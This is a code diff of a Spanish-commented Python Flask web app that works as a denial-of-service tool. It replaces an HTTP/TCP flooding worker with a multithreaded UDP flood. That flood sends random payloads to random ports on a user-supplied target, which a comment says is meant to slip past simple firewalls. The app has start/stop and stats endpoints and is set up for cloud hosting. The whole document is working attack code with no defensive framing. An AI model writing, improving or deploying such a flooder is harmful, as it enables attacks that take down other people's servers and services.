@@ -2,39 +2,39 @@ import threading
 import time
 import random
 import socket
-import requests
 import os
 from flask import Flask, render_template, request, jsonify
 
 app = Flask(__name__)
 
-# Control Maestro - Valores iniciales fijos para evitar el 'undefined'
+# --- Motor de Ataque ---
 bots_activos = False
-stats = {
-    "total_mb": 0, 
-    "hilos": 0, 
-    "status": "READY"
-}
+stats = {"total_mb": 0, "hilos": 0, "ip": "0.0.0.0"}
 
-def bot_worker(target):
+def flood_engine(target_ip):
     global bots_activos, stats
     stats["hilos"] += 1
-    # Paquete de 2MB aleatorios
-    data = random._urandom(2 * 1024 * 1024) 
-    es_url = target.startswith("http")
-
+    
+    # Creamos el socket de alta velocidad
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # Generamos 1MB de basura aleatoria en RAM para disparar rápido
+    # 1024 KB * 1024 = 1MB
+    payload = random._urandom(1024 * 60) # Paquete UDP máximo optimizado
+    
     while bots_activos:
         try:
-            if es_url:
-                requests.post(target, data=data, timeout=3)
-            else:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.settimeout(3)
-                    s.connect((target, 80))
-                    s.sendall(data)
-            stats["total_mb"] += 2
-        except:
-            time.sleep(2) # Pausa si hay error de red
+            # Enviamos ráfaga para completar los 1000MB del loop
+            for _ in range(16500): 
+                if not bots_activos: break
+                # Disparo a puerto aleatorio para saltar firewalls simples
+                port = random.randint(1, 65535)
+                sock.sendto(payload, (target_ip, port))
+            
+            stats["total_mb"] += 1000 # Reportamos el Giga enviado
+        except Exception as e:
+            time.sleep(0.1) # Pausa mínima si el sistema satura el socket
+            
     stats["hilos"] -= 1
 
 @app.route('/')
@@ -44,33 +44,39 @@ def index():
 @app.route('/api/control', methods=['POST'])
 def control():
     global bots_activos, stats
-    try:
-        data = request.json
-        if data.get("action") == "start":
-            if bots_activos: return jsonify({"status": "RUNNING"})
-            
-            target = data.get("target")
-            if not target: return jsonify({"status": "NO TARGET"})
-            
-            bots_activos = True
-            stats["status"] = "ATTACKING"
-            threads = int(data.get("threads", 1))
-            
-            for _ in range(threads):
-                threading.Thread(target=bot_worker, args=(target,), daemon=True).start()
-            return jsonify({"status": "STARTED"})
+    data = request.json
+    
+    if data.get("action") == "start":
+        if bots_activos: return jsonify({"status": "BUSY"})
         
-        else:
-            bots_activos = False
-            stats["status"] = "OFFLINE"
-            return jsonify({"status": "STOPPED"})
-    except:
-        return jsonify({"status": "ERROR"})
+        target = data.get("target").strip()
+        # Limpiar entrada por si ponen basura
+        target = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+        
+        try:
+            # Esto confirma que la IP es real y alcanzable
+            target_ip = socket.gethostbyname(target)
+            stats["ip"] = target_ip
+        except:
+            return jsonify({"status": "INVALID IP"})
+
+        bots_activos = True
+        num_threads = int(data.get("threads", 10))
+        
+        for _ in range(num_threads):
+            threading.Thread(target=flood_engine, args=(target_ip,), daemon=True).start()
+            
+        return jsonify({"status": "ATTACKING"})
+    
+    bots_activos = False
+    stats["ip"] = "0.0.0.0"
+    return jsonify({"status": "STOPPED"})
 
 @app.route('/api/stats')
 def get_stats():
     return jsonify(stats)
 
 if __name__ == '__main__':
+    # Puerto dinámico para Railway
     port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(host='0.0.0.0', port=port)
